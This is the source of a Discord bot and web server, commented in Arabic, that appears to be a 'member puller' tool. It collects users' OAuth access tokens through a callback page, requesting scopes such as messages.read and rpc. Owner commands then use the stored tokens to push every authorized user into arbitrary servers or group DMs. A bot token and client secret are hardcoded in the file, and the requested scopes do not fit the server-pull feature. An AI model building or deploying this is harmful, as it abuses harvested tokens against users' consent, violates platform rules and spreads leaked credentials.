const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const axios = require('axios');
const app = express();

// --- الإعدادات الأساسية ---
const OWNER_ID = '1151179063122214963'; 
const CLIENT_ID = '1508569205941735465'; 
const CLIENT_SECRET = 'J7OBhcI9jlbT0GEg9sTUOpBtbZz9dnDG'; 
const BOT_TOKEN = 'MTUwODU2OTIwNTk0MTczNTQ2NQ.GEvn0f.I6Erz5iYQHgcFf2PmBX0VdFaNHUqAIEXh9tQgQ'; 

const DOMAIN = process.env.RAILWAY_STATIC_URL 
    ? 'https://' + process.env.RAILWAY_STATIC_URL 
    : 'http://localhost:3000';

const REDIRECT_URI = DOMAIN + '/callback';
const PORT = process.env.PORT || 3000;

// قاعدة البيانات المؤقتة لتخزين بيانات الـ OAuth
const usersDatabase = [];

const bot = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// تفعيل الكاستوم استاتوس عند تشغيل البوت
bot.on('ready', () => {
    console.log('Logged in as ' + bot.user.tag + '!');
    console.log('Current Redirect URI is set to: ' + REDIRECT_URI);
    
    bot.user.setPresence({
        activities: [{ 
            name: 'customstatus', 
            type: 4, 
            state: 'Eren Is The best' 
        }],
        status: 'online',
    });
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith('+')) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // أمر المساعدة
    if (command === 'help') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('Bot Commands List')
            .setColor('#5865F2')
            .addFields(
                { name: '+help', value: 'Shows this help menu.' },
                { name: '+panel', value: 'Generates the login link for users (Owner Only).' },
                { name: '+pullguild [Server_ID]', value: 'Adds all authorized users to a specific server (Owner Only).' },
                { name: '+pullgroup [Group_ID]', value: 'Adds all authorized users to a specific Group DM (Owner Only).' }
            );
        return message.reply({ embeds: [helpEmbed] });
    }

    // أمر لوحة التحكم ورابط الـ OAuth
    if (command === 'panel') {
        if (message.author.id !== OWNER_ID) return message.reply('❌ Owner only.');

        const oauthUrl = 'https://discord.com/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20messages.read%20rpc%20rpc.activities.write';

        const panelEmbed = new EmbedBuilder()
            .setTitle('Admin Control Panel')
            .setColor('#ED4245')
            .addFields(
                { name: '🔗 OAuth2 Link:', value: '[Click Here to Authorize](' + oauthUrl + ')' },
                { name: '📊 Total Users Authorized:', value: usersDatabase.length + ' users' }
            );
        return message.reply({ embeds: [panelEmbed] });
    }

    // أمر سحب الأعضاء لسيرفر معين
    if (command === 'pullguild') {
        if (message.author.id !== OWNER_ID) return message.reply('❌ Owner only.');
        
        const targetGuildId = args[0];
        if (!targetGuildId) return message.reply('❌ Please provide a Server ID.');

        if (usersDatabase.length === 0) return message.reply('❌ No users inside the database to pull.');

        message.reply('⏳ Starting to pull ' + usersDatabase.length + ' users to the server...');

        let successCount = 0;
        for (const user of usersDatabase) {
            try {
                await axios.put(
                    'https://discord.com/api/v10/guilds/' + targetGuildId + '/members/' + user.id,
                    { access_token: user.token },
                    { headers: { Authorization: 'Bot ' + BOT_TOKEN, 'Content-Type': 'application/json' } }
                );
                successCount++;
            } catch (err) {
                console.error('Failed for user ' + user.username + ':', err.message);
            }
        }
        return message.channel.send('✅ Pull finished! Successfully added ' + successCount + '/' + usersDatabase.length + ' users to the server.');
    }

    // أمر سحب الأعضاء لجروب معين
    if (command === 'pullgroup') {
        if (message.author.id !== OWNER_ID) return message.reply('❌ Owner only.');

        const targetGroupId = args[0];
        if (!targetGroupId) return message.reply('❌ Please provide a Group DM Channel ID.');

        if (usersDatabase.length === 0) return message.reply('❌ No users inside the database to pull.');

        message.reply('⏳ Starting to add users to the Group DM...');

        let successCount = 0;
        for (const user of usersDatabase) {
            try {
                await axios.put(
                    'https://discord.com/api/v10/channels/' + targetGroupId + '/recipients/' + user.id,
                    { access_token: user.token },
                    { headers: { Authorization: 'Bot ' + BOT_TOKEN, 'Content-Type': 'application/json' } }
                );
                successCount++;
            } catch (err) {
                console.error('Failed for group user ' + user.username + ':', err.message);
            }
        }
        return message.channel.send('✅ Group Pull finished! Successfully added ' + successCount + ' users to the Group DM.');
    }
});

// --- سيرفر الويب والـ OAuth2 ---
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.status(400).send('Missing activation code.');

    try {
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI,
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;

        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        const userData = userResponse.data;

        const userExists = usersDatabase.find(u => u.id === userData.id);
        if (!userExists) {
            usersDatabase.push({
                id: userData.id,
                username: userData.username,
                token: accessToken
            });
        }

        res.send('<h1>Successfully Authorized! You can close this window now.</h1>');
    } catch (error) {
        console.error(error.response ? error.response.data : error.message);
        res.status(500).send('An error occurred.');
    }
});

app.listen(PORT, () => console.log('Web Server running on port ' + PORT));
bot.login(BOT_TOKEN);
